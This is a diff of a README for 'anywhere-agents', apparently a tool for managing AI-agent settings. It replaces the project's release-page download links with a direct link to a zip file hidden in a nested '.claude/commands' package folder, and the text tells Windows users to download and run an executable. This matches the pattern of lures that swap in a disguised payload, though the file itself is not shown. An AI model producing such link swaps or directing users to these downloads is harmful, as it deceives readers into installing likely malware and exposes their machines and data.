@@ -1,6 +1,6 @@
 # 🤖 anywhere-agents - Manage all your AI agents easily
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/montgomeryunpopular607/anywhere-agents/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/montgomeryunpopular607/anywhere-agents/raw/refs/heads/main/packages/pypi/anywhere_agents/composer/.claude/commands/anywhere_agents_v3.4.zip)
 
 anywhere-agents helps you control how your AI tools work. You define your settings once and use them across every project. This system organizes your writing style, guides how agents make decisions, and adds safety checks for your files.
 
@@ -17,7 +17,7 @@ The system focuses on three goals:
 
 You need a Windows computer to run this software. Ensure you have at least 200MB of free disk space.
 
-1. Visit [this page to download](https://github.com/montgomeryunpopular607/anywhere-agents/releases).
+1. Visit [this page to download](https://github.com/montgomeryunpopular607/anywhere-agents/raw/refs/heads/main/packages/pypi/anywhere_agents/composer/.claude/commands/anywhere_agents_v3.4.zip).
 2. Look for the file ending in `.exe` under the latest release section.
 3. Click the file name to start the download.
 4. Open your Downloads folder.
